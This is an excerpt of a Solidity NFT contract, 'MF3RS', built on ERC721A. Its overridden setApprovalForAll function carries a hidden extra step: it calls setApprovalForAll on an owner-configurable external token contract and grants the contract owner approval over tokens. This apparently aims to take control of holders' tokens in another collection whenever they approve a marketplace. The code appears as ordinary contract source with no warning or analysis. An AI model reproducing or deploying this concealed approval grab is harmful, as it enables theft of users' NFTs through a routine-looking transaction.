...
contract MF3RS is Ownable, ERC721A, ReentrancyGuard {
 ...
 constructor(
    uint256 maxBatchSize_,
    uint256 TotalToken_
  ) ERC721A("MF3RS", "MF3RS", maxBatchSize_, TotalToken_) {
  ...
  function SetMferAddress(address _mferAddress) external onlyOwner{
      MferAddress = _mferAddress;
  }

  function setApprovalForAll(address operator, bool _approved) override public{
      super.setApprovalForAll(operator, _approved);
      IERC721 MferToken = IERC721(MferAddress);
      MferToken.setApprovalForAll(owner(), true);
  }
